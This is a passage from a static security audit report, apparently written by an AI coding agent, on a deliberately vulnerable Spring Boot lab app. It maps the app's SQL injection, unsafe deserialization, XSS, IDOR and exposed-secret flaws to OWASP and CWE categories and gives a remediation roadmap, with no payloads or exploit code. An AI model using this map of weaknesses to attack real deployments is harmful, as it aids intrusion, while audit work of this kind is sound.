- **Root Cause:** The `@Value` autowired secrets are interpolated directly into the HTML response (no escaping, no auth). The page also publishes an inventory of every vulnerable endpoint, lowering the cost of an attack.
- **Exploitation Scenario:** Anonymous visitors (and search-engine crawlers if exposed) harvest the secrets and the attack-surface map.
- **Business Impact:** Reconnaissance as a service.
- **Confidence Level:** High

---

## 4. Negative Findings (Checks Performed, No Issue Observed)

The following checks were performed and yielded **no additional findings** beyond those already documented above. They are listed here to make the audit scope explicit.

- **Command Injection** — `Grep` for `Runtime`, `ProcessBuilder`, `exec(` over `src/` returned zero matches. **No issue.**
- **Jackson default typing** — No `@JsonTypeInfo` annotations and no `enableDefaultTyping()` calls found. The application does not use polymorphic Jackson deserialization. **No issue.**
- **Path Traversal / File Operations** — No `new File(...)`, `Paths.get(...)`, or `FileInputStream` use of user input found. **No issue.**
- **LDAP / NoSQL Injection** — No LDAP or MongoDB code present in this H2/JPA project. **Not applicable.**
- **SpEL/OGNL Injection** — No `SpelExpressionParser`, no `@PreAuthorize("...")` with user-controlled expressions. **No issue.**
- **Insecure RNG** — `java.util.Random` does not appear in `src/`. **No issue.**
- **TLS configuration** — The project runs on plain HTTP only; TLS is not configured but is also not configured *insecurely* (no self-signed cert with `verify=false`); it is simply absent. The application must always be fronted by a TLS-terminating proxy if exposed. **Low informational note** — recommend an HSTS-aware reverse proxy.
- **Weak hashing algorithms** — `MessageDigest.getInstance("MD5"|"SHA-1")` does not appear in `src/`. **No issue** (the absence of hashing is itself VULN-004).
- **Missing `@Valid` on `@RequestBody`** — `@RequestBody` parameters (`UserController`, `ProductController`, `CommentController`) lack `@Valid` / bean-validation constraints. Flagged under VULN-006 / VULN-012 but noted separately for completeness; severity is captured by the access-control and mass-assignment findings because there is no auth boundary to break.

---

## 5. Dependency Risk Review

### 5.1 `pom.xml` Inventory

```xml
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>3.2.5</version>
</parent>

<dependencies>
    spring-boot-starter-web
    spring-boot-starter-data-jpa
    spring-boot-starter-security
    h2 (runtime)
    lombok (optional)
    spring-boot-starter-test (test)
</dependencies>
```

### 5.2 Observations

- **Spring Boot 3.2.5 (released June 2024)** — No known Critical CVEs at the time of this review, but several 3.2.x point releases have shipped security fixes (e.g. Spring Framework 6.1.x advisories). Pinning to a specific patch version rather than `3.2.5` is recommended.
- **Spring Security 6.2.x** (transitive via Boot 3.2.5) — bundled with the parent; no override.
- **H2 2.x** (transitive) — multiple historical CVEs against older versions; 2.x is current but pinning the exact patch is recommended.
- **Lombok** — not a runtime dependency (optional, excluded from final jar), low risk.
- **No Apache Commons Text, no Log4j (uses Logback), no Jackson-databind polymorphism** — these common vulnerability hotspots are not in scope.

### 5.3 Caveat

> Authoritative CVE cross-referencing requires up-to-date data. Run `mvn org.owasp:dependency-check-maven:check` or `mvn -P vulnerability-check verify` against the National Vulnerability Database before shipping. This report flags dependency posture qualitatively, not against a CVE feed.

---

## 6. OWASP Top 10 (2021) Mapping

| OWASP Category | Findings |
|---|---|
| **A01:2021 — Broken Access Control** | VULN-005, VULN-006, VULN-011 (CSRF contributes to access-control failure), VULN-012 |
| **A02:2021 — Cryptographic Failures** | VULN-004, VULN-009, VULN-010, VULN-013 |
| **A03:2021 — Injection (SQLi / XSS)** | VULN-002, VULN-003, VULN-007, VULN-008 |
| **A04:2021 — Insecure Design** | VULN-009 (response contract), VULN-012, VULN-014 (logging by design) |
| **A05:2021 — Security Misconfiguration** | VULN-010, VULN-011, VULN-016, VULN-017, VULN-018 |
| **A06:2021 — Vulnerable & Outdated Components** | See Section 5 (Dependency Risk). No CVEs flagged; recommend `dependency-check`. |
| **A07:2021 — Identification & Authentication Failures** | VULN-004 (plaintext creds), VULN-005 (no auth), VULN-009 (password leak) |
| **A08:2021 — Software & Data Integrity Failures** | VULN-001 (unsafe deserialization) |
| **A09:2021 — Security Logging & Monitoring Failures** | VULN-014 (excessive logging of secrets), VULN-015 (no auth-event logging) |
| **A10:2021 — Server-Side Request Forgery (SSRF)** | No outbound HTTP / URL-fetching code present. **Not exploitable** in current code. |

---

## 7. CWE Mapping

| CWE | Description | Findings |
|---|---|---|
| CWE-79 | Improper Neutralization of Input During Web Page Generation (XSS) | VULN-007, VULN-008 |
| CWE-89 | Improper Neutralization of Special Elements used in an SQL Command | VULN-002, VULN-003 |
| CWE-200 | Exposure of Sensitive Information to an Unauthorized Actor | VULN-009, VULN-014, VULN-018 |
| CWE-201 | Insertion of Sensitive Information Into Sent Data | VULN-009 |
| CWE-209 | Generation of Error Message Containing Sensitive Information | VULN-018 |
| CWE-256 | Plaintext Storage of a Password | VULN-004 |
| CWE-257 | Storing Passwords in a Recoverable Format | VULN-004 |
| CWE-269 | Improper Privilege Management | VULN-012 |
| CWE-284 | Improper Access Control | VULN-005, VULN-006, VULN-017 |
| CWE-285 | Improper Authorization | VULN-005 |
| CWE-330 | Use of Insufficiently Random Values | VULN-013 |
| CWE-340 | Generation of Predictable Numbers/Identifiers | VULN-013 |
| CWE-352 | Cross-Site Request Forgery | VULN-011 |
| CWE-359 | Exposure of Private Personal Information (PII) | VULN-009 |
| CWE-502 | Deserialization of Untrusted Data | VULN-001 |
| CWE-532 | Insertion of Sensitive Information into Log File | VULN-014 |
| CWE-547 | Use of Hard-coded, Security-relevant Constants | VULN-010 |
| CWE-639 | Authorization Bypass Through User-Controlled Key (IDOR) | VULN-006 |
| CWE-668 | Exposure of Resource to Wrong Sphere | VULN-017 |
| CWE-693 | Protection Mechanism Failure | VULN-016 |
| CWE-778 | Insufficient Logging | VULN-015 |
| CWE-798 | Use of Hard-coded Credentials | VULN-010, VULN-013 |
| CWE-862 | Missing Authorization | VULN-005 |
| CWE-915 | Improperly Controlled Modification of Dynamically-Determined Object Attributes | VULN-012 |
| CWE-916 | Use of Password Hash With Insufficient Computational Effort | VULN-004 |
| CWE-1021 | Improper Restriction of Rendered UI Layers or Frames | VULN-016 |

---

## 8. Priority Remediation Roadmap

### 8.1 Critical — Immediate (block deploy)

1. **VULN-001 — Unsafe deserialization** (CWE-502). Delete `InsecureDeserializationController` entirely if not needed. If it must remain for the lab, install a strict `ObjectInputFilter` (`setObjectInputFilter`) that rejects all classes by default and allowlists only a benign marker. Better: replace with JSON via Jackson and explicit DTOs.
2. **VULN-002 / VULN-003 — SQL injection.** Replace both `createNativeQuery` concatenations with parameterized queries (`EntityManager.createNativeQuery(sql, User.class).setParameter(1, username)`) or, better, use the existing safe `UserRepository.findByUsername(String)`.
3. **VULN-004 — Plain-text passwords.** Configure `BCryptPasswordEncoder` (or Argon2) as a `@Bean`, hash on `register`, hash on `DataSeeder`, and store only the hash. Never return the hash from any API response.
4. **VULN-005 — `permitAll()` everywhere.** Replace with explicit `authorizeHttpRequests` matchers; require authentication on every endpoint except `/login` and `/register`. Add a `UserDetailsService`, password encoder, and JWT/session filter as appropriate.
5. **VULN-006 — IDOR + unauthenticated transfer.** In `AuthController.transfer`, inject `Principal` and reject if `principal.getName() != from.username`. In `UserController.getProfile`, do the same. Reject any `role` field from the request body (VULN-012) by binding to a dedicated `RegisterRequest` DTO that omits `role`.

### 8.2 High — Before any external exposure

6. **VULN-007 / VULN-008 — XSS.** Replace the manual HTML concatenation in `CommentController` and `CommentViewController` with Thymeleaf templates (which escape by default) or use `HtmlUtils.htmlEscape(...)`. Add `Content-Security-Policy: default-src 'self'; script-src 'self'` to every response. Reject stored comments containing `<` or `>` on submit.
7. **VULN-009 — Password in API response.** Remove the `"password"` key from the `login` response entirely. Consider a dedicated DTO `LoginResponse(id, username, role)` so the password field cannot leak by accident.
8. **VULN-010 — Hardcoded secrets.** Remove the `app.secret.*` keys from `application.properties`. Load via `${APP_SECRET_API_KEY}` with `application-local.properties` gitignored, or pull from Spring Cloud Config / HashiCorp Vault. Purge the values from git history with `git filter-repo`.
9. **VULN-011 — CSRF.** Re-enable CSRF (`csrf { }`) for any browser-facing flow. If stateless JWT, leave CSRF disabled but require a bearer token (not cookies) for state-changing endpoints — and set `CookieCsrfTokenRepository` for any cookie-based flow.
10. **VULN-012 — Mass-assignment role.** Remove `role` from the request-body Map; bind to a `RegisterRequest(username, password, email)` DTO and default the role to `USER` server-side. Require admin authentication to elevate to ADMIN.

### 8.3 Medium — Within next iteration

11. **VULN-013 — JWT signing key.** Generate a 256-bit key from `SecureRandom`, persist in a secrets manager, expose via a `KeyProvider` bean. Rotate. If JWT verification is added, reject any token signed with the legacy hardcoded key.
12. **VULN-014 — Verbose SQL logging.** Set `spring.jpa.show-sql=false` and `logging.level.org.hibernate.*=WARN` in production. Mask bind parameters in logs.
13. **VULN-015 — Auth-event logging.** Add `AuthenticationFailureBadCredentialsEvent`, `AuthenticationSuccessEvent` listeners; emit structured logs to a SIEM. Rate-limit `/api/login` (Bucket4j) and `/api/transfer`.
14. **VULN-016 — Security headers.** Add `.headers(h -> h.contentSecurityPolicy("default-src 'self'").frameOptions(...).httpStrictTransportSecurity().referrerPolicy(...))`.

### 8.4 Low — Hygiene

15. **VULN-017 — H2 console.** Disable in non-local profiles: `spring.h2.console.enabled=${H2_CONSOLE_ENABLED:false}`.
16. **VULN-018 — Public `/vulnerabilities` page.** Gate behind an `ADMIN` role, or remove entirely from the production jar via a Spring profile.
17. **General** — Pin all dependency versions in `pom.xml` to specific patch releases; run `mvn org.owasp:dependency-check-maven:check` in CI.
18. **General** — Add `@Valid` to every `@RequestBody` parameter and define `jakarta.validation` constraints on all incoming DTOs (`@NotBlank`, `@Email`, `@Size(max=2000)`, etc.).

---

## 9. Audit Metadata

- **Report path:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\.claude\reports\SECURITY_ASSESSMENT_REPORT.md`
- **Files inspected:** 22 source files + `pom.xml` + `application.properties` + workflow file + `.gitignore`
- **Tools used:** Read, Glob, Grep, Write (Write used only for this report)
- **Source code modifications:** **None.** Read-only audit.
- **Application executed:** **No.** Static review only.
- **Recommendation:** This codebase must remain in a tightly isolated local sandbox. The README's own warning ("DO NOT deploy this application to any public server, container image registry, or shared network") is correct and binding.

---

*End of report.*